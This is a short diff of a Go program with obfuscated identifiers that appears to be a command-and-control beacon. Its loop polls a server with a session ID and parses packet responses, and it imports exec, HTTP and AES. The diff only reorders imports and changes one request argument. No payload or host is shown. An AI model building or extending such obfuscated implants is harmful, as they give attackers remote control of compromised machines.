@@ -1,16 +1,16 @@
 package main
 
 import(
-	"io/ioutil"
+	"time"
 	"strings"
 	"strconv"
-	"time"
+	"os/exec"
+	"net/http"
+	"io/ioutil"
 	"math/rand"
 	"crypto/aes"
 	"crypto/cipher"
 	"encoding/base64"
-	"os/exec"
-	"net/http"
 )
 
 const(
@@ -91,7 +91,7 @@ func main() {
 	rand.Seed( time.Now().UnixNano() )
 	obf_var_rate := 1 + rand.Intn(2-1)
 	for {
-		obf_var_res := obf_func_send_request(obf_const_get_tag, obf_const_session_id, "nil")
+		obf_var_res := obf_func_send_request(obf_const_get_tag, obf_const_session_id, "")
 		if obf_var_res != "" {
 			obf_var_response := []byte("")
 			obf_var_packet_list := strings.Split(obf_var_res, ",")
